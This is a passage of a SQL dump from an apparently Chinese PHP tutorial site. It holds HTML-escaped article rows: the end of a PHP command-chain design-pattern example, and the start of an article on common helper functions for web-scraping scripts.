style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;); &amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;keyword&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:blue;font-weight:bold;&quot;&gt;return&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;true; &amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;} &amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;} &amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;span class=&quot;keyword&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:blue;font-weight:bold;&quot;&gt;class&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;MailCommand&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;keyword&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:blue;font-weight:bold;&quot;&gt;implements&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;ICommand{&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;comment&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:green;&quot;&gt;//&amp;nbsp;命令处理类2&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;span class=&quot;keyword&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:blue;font-weight:bold;&quot;&gt;public&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;keyword&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:blue;font-weight:bold;&quot;&gt;function&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;onCommand(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#dd0000;&quot;&gt;$name&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#dd0000;&quot;&gt;$args&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;){ &amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;keyword&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:blue;font-weight:bold;&quot;&gt;if&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#dd0000;&quot;&gt;$name&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;!=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:blue;&quot;&gt;''mail''&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;keyword&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:blue;font-weight:bold;&quot;&gt;return&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;false; &amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;func&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;echo&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:blue;&quot;&gt;&quot;MailCommand&amp;nbsp;handling&amp;nbsp;''mail''\\n&quot;&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;); &amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;keyword&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:blue;font-weight:bold;&quot;&gt;return&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;true; &amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;} &amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;} &amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#dd0000;&quot;&gt;$cc&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;keyword&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:blue;font-weight:bold;&quot;&gt;new&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;CommandChain(); &amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#dd0000;&quot;&gt;$cc&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;-&amp;gt;addCommand(&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;keyword&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:blue;font-weight:bold;&quot;&gt;new&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;UserCommand()&amp;nbsp;); &amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#dd0000;&quot;&gt;$cc&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;-&amp;gt;addCommand(&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;keyword&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:blue;font-weight:bold;&quot;&gt;new&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;MailCommand()&amp;nbsp;); &amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#dd0000;&quot;&gt;$cc&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;-&amp;gt;runCommand(&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:blue;&quot;&gt;''addUser''&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;,&amp;nbsp;null&amp;nbsp;); &amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#dd0000;&quot;&gt;$cc&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;-&amp;gt;runCommand(&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:blue;&quot;&gt;''mail''&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;,&amp;nbsp;null&amp;nbsp;); &amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;?&amp;gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;/ol&gt;\r\n&lt;/span&gt;', 1, 1, 0, 0, 1302792118, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(63, 1, 'PHP采集程序中常用的函数-web技术', '', '', '/获得当前的脚本网址&lt;br /&gt;\r\nfunction get_php_url(){&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; if(!empty($_SERVER[&quot;REQUEST_URI&quot;])){&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $scriptName = $_SERVER[&quot;REQUEST_URI&quot;];&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $nowurl = $scriptName;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }else{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $scriptName = $_SERVER[&quot;PHP_SELF&quot;];&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; if(empty($_SERVER[&quot;QUERY_STRING&quot;])) $nowurl = $scriptName;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; else $nowurl = $scriptName.&quot;?&quot;.$_SERVER[&quot;QUERY_STRING&quot;];&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; return $nowurl;&lt;br /&gt;\r\n}&lt;br /&gt;\r\n//把全角数字转为半角数字&lt;br /&gt;\r\nfunction GetAlabNum($fnum){&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $nums = array(&quot;０&quot;,&quot;１&quot;,&quot;２&quot;,&quot;３&quot;,&quot;４&quot;,&quot;５&quot;,&quot;６&quot;,&quot;７&quot;,&quot;８&quot;,&quot;９&quot;);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $fnums = &quot;0123456789&quot;;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; for($i=0;$i&amp;lt;=9;$i++) $fnum = str_replace($nums[$i],$fnums[$i],$fnum);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $fnum = ereg_replace(&quot;[^0-9\\.]|^0{1,}&quot;,&quot;&quot;,$fnum);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; if($fnum==&quot;&quot;) $fnum=0;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; return $fnum;&lt;br /&gt;\r\n}&lt;br /&gt;\r\n//去除HTML标记&lt;br /&gt;\r\nfunction Text2Html($txt){&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $txt = str_replace(&quot;&amp;nbsp; &quot;,&quot;　&quot;,$txt);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $txt = str_replace(&quot;&amp;lt;&quot;,&quot;&amp;amp;lt;&quot;,$txt);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $txt = str_replace(&quot;&amp;gt;&quot;,&quot;&amp;amp;gt;&quot;,$txt);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $txt = preg_replace(&quot;/[\\r\\n]{1,}/isU&quot;,&quot;&amp;lt;br/&amp;gt;\\r\\n&quot;,$txt);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; return $txt;&lt;br /&gt;\r\n}&lt;p&gt;//清除HTML标记&lt;br /&gt;\r\nfunction ClearHtml($str){&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $str = str_replace(''&amp;lt;'',''&amp;amp;lt;'',$str);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $str = str_replace(''&amp;gt;'',''&amp;amp;gt;'',$str);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; return $str;&lt;br /&gt;\r\n}&lt;br /&gt;\r\n//相对路径转化成绝对路径&lt;br /&gt;\r\nfunction relative_to_absolute($content, $feed_url) { &lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; preg_match(''/(http|https|ftp):\\/\\//'', $feed_url, $protocol); &lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; $server_url = preg_replace(&quot;/(http|https|ftp|news):\\/\\//&quot;, &quot;&quot;, $feed_url); &lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; $server_url = preg_replace(&quot;/\\/.*/&quot;, &quot;&quot;, $server_url); &lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; if ($server_url == '''') { &lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; return $content; &lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; } 